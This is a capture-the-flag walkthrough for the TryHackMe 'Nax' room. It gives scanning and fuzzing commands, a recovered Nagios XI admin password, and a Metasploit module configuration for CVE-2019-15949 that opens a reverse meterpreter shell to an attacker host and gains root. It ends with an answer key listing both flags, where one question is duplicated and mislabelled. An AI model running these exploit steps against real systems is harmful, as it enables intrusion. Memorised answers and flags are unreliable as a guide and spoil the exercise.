# Solution

## URL
- [Nax](https://tryhackme.com/room/nax)

## Steps

### Enumerate
1. Running a full port scan with rustscan and doing service detection with NMAP: `rustscan -a 10.10.196.39 -r 1-65535 -- -A | tee port-scan.txt`.
2. A website is running on port 80, enumerating directories/files: `ffuf -u http://10.10.196.39/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -mc 200,301,302,403 -fs 1332 -v | tee ffuf-dir-scan.txt`.
3. This did not return much useful data, checking the source code of index page returned a comment. Using that as a directory name gets us the login page of Nagios XI `/nagiosxi`.
4. Let's fuzz that: `ffuf -u http://10.10.196.39/nagiosxi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -mc 200,301,302,403 -fs 27 -v`
5. The elements in the index page `/` might be references to ASCII codes, changing the ASCII codes to text gives use: `47 80 73 51 84 46 80 78 103` => `/PI3T.PNg`.
6. Downloading that file: `wget http://10.10.196.39/PI3T.PNg`.
7. Checking exif data using exiftool `exiftool PI3T.PNg`, gives us the name of the creator `Piet Mondrian`.
8. Researching him we stumble across piet programming language, we used gimp to export out png file to ppm file in raw format.
9. Next run these commands:
    ```
    git clone https://github.com/gleitz/npiet.git
    cd npiet
    ./configure
    make
    ./npiet ../PI3T.ppm
    ```
10. This will give us the credentials: `nagiosadmin:n3p3UQ&9BjLp4$7uhWdY`.
11. Let's try to login with this in the login page we found.

### Initial access using CVE
1. We successfully logged in, at the bottom right we can see the version number is 5.5.6.
2. Searching for all CVEs for Nagios XI for this version, we get `CVE-2019-15949`.
3. Start metasploit with `msfconnsole` and `search CVE-2019-15949`.
4. Now to exploit run these:
    ```
    exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
    set RHOSTS 10.10.196.39
    set PASSWORD n3p3UQ&9BjLp4$7uhWdY
    set LHOST 10.17.47.107
    exploit
    ```
5. Once we get a meterpreter session, drop into system shell using `shell`.
6. Check user: `whoami`, we are `root`. Great!
7. Find `user.txt`: `find / -name "user.txt" -type f 2> /dev/null`. Found it in: `/home/galand/user.txt`.
8. Reading that we get the first flag: `THM{84b17add1d72a9f2e99c33bc568ae0f1}`
9. Find `root.txt`: `find / -name "root.txt" -type f 2> /dev/null`. FOund it in `/root/root.txt`.
10. Reading that we get the second flag: `THM{c89b2e39c83067503a6508b21ed6e962}`.

### Task 1
#### What hidden file did you find?
1. The answer is `PI3T.PNg`.

#### Who is the creator of the file?
1. The answer is `Piet Mondrian`.

#### What is the username you found?
1. The answer is `Piet Mondrian`.

#### What is the username you found?
1. The answer is `n3p3UQ&9BjLp4$7uhWdY`.

#### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
1. The answer is `CVE-2019-15949`.

#### After Metasploit has started, let's search for our target exploit using the command 'search applicationame'. What is the full path (starting with exploit) for the exploitation module?
1. The answer is `exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`.

#### Compromise the machine and locate user.txt
1. The answer is `THM{84b17add1d72a9f2e99c33bc568ae0f1}`.

#### Locate root.txt
1. The answer is `THM{c89b2e39c83067503a6508b21ed6e962}`.